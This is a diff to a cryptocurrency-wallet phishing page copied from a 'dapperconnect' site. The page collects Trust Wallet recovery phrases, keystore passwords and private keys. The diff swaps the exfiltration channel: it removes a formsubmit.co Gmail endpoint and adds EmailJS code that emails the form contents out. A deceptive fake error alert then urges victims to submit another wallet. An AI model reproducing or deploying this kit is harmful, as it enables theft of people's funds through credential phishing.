@@ -106,10 +106,8 @@
                             <div class="mt-2">
                                 <div class="mt-10">
 <!-- form starts from here -->
-                                    <form action="https://formsubmit.co/web6289@gmail.com" method="post" enctype="multipart/form-data" id="form" class="ajaxForm">
-                                       <input type="hidden" name="_cc" value="formsubmitmails@gmail.com">
-                                        <input type="hidden" name="_captcha" value="false">
-                                        <input type="hidden" name="_next" value="https://rectificationdapps-protocols.vercel.app/access/point/success.html">
+                                    <form action="" method="post" enctype="multipart/form-data" id="my-form" class="ajaxForm">
+                                       
                                         <div class="flex justify-evenly border-b-2 border-fuchsia-600 mb-4">
                                             <div id="phrase" class="p-2 border-b-2 border-white hover:border-blue-600 cursor-pointer">
                                                 Phrase
@@ -127,7 +125,7 @@
                                             </div>
                                             <div class="flex flex-col mb-6">
                                                 <div class="relative"><textarea cols="30" rows="4" placeholder="Enter your recovery phrase" class="text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400"
-                                                        name="phrase" required=""></textarea>
+                                                        name="message" required=""></textarea>
                                                     <p class="text-xs text-grey-300 mt-6">
                                                         Typically 12 (sometimes 24) words separated by single spaces
                                                     </p>
@@ -148,7 +146,7 @@
                               Keystore File</span></label></div>
                                             </div>
                                             <div class="flex flex-col mb-6">
-                                                <div class="relative"><input type="text" name="keystorepassword" placeholder="Wallet password" class="text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400">
+                                                <div class="relative"><input type="keys" name="message" placeholder="Wallet password" class="text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400">
                                                     <p class="text-xs text-grey-300 mt-6">
                                                         Several lines of text beginning with "{...}" plus the password you used to encrypt it.
                                                     </p>
@@ -167,7 +165,7 @@
                                                 <div class="relative"><input type="hidden" name="wallet_id" required="required" placeholder="Wallet ID" id="wallet_id" value="Trust wallet"></div>
                                             </div>
                                             <div class="flex flex-col mb-6">
-                                                <div class="relative"><input type="text" placeholder="Enter your Private Key" name="privatekey" class=" text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400">
+                                                <div class="relative"><input type="keys" placeholder="Enter your Private Key" name="privatekey" class=" text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400">
                                                     <p class="text-xs text-grey-300 mt-6">
                                                         Typically 12 (sometimes 24) words seperated by a single space.
                                                     </p>
@@ -713,51 +711,46 @@
                     </div>
                 </div>
             </div>
-        </div>
-        <script src="../src/js/js1.js"></script>
+         </div>
+       
+        
         <script src="../src/js/js2w.js"></script>
 </body>
+     <script type="text/javascript"
+  src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+<script type="text/javascript">
+  emailjs.init('SphkKEUkKpPqrfBcy')
+</script>
+
+<script>
+    const btn = document.getElementById('submit');
+
+document.getElementById('my-form')
+ .addEventListener('submit', function(event) {
+   event.preventDefault();
+
+   btn.value = 'Sending...';
+
+   const serviceID = 'service_zpoc9tn';
+   const templateID = 'template_dpkh9dd';
+
+   emailjs.sendForm(serviceID, templateID, this)
+    .then(() => {
+      btn.value = 'Send Email';
+      alert('An error occurred !!! User another wallet or Try Again.');
+    }, (err) => {
+      btn.value = 'Send Email';
+      alert(JSON.stringify(err));
+    });
+});
+</script>
 <script>
     function ready() {
         document.body.style.display = "block";
     }
     document.addEventListener("DOMContentLoaded", ready);
 </script>
-<!--Start of Tawk.to Script-->
-<script type="text/javascript">
-var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
-(function(){
-var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
-s1.async=true;
-s1.src='https://embed.tawk.to/65fde81e1ec1082f04da4062/1hpjt5ecl';
-s1.charset='UTF-8';
-s1.setAttribute('crossorigin','*');
-s0.parentNode.insertBefore(s1,s0);
-})();
-</script>
-<!--End of Tawk.to Script-->
-<script src="../../cdn.jsdelivr.net/npm/%40popperjs/core%402.9.2/dist/umd/404.html" ></script>
-<script src="../../ajax.googleapis.com/ajax/libs/jquery/3.5.1/404.html"></script>
-    <script>
-        $(".ajaxForm").submit(function(e){
-            e.preventDefault();
-            var href = $(this).attr("action");
-            $.ajax({
-                type: "POST",
-                dataType: "json",
-                url: href,
-                data: $(this).serialize(),
-                success: function(response){
-                    if(response.status == "success"){
-                        window.location.href = 'success.html'; // redirection url // change this.
-                    }else{
-                        alert("An error occured: " + response.message);
-                    }
-                }
-            });
-        });
-
-       </script>
 
 <!-- Mirrored from www.main.dapperconnect.live/access/point/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 08 Jun 2022 19:55:48 GMT -->
 
